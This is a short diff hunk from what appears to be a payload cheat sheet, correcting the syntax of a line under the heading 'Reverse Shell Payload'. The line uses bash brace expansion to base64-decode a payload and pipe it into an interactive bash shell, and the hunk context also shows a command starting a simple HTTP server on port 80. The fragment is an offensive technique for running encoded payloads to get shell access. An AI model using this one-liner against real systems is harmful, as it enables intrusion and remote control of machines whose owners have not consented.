@@ -149,7 +149,7 @@ python -m http.server 80
 
 Reverse Shell Payload
 ```shell
-bash -c {echo,{payload}|{base64,-d}|{bash,-i}
+bash -c {echo,payload}|{base64,-d}|{bash,-i}
 ```
 
 Shell Base64 encoded
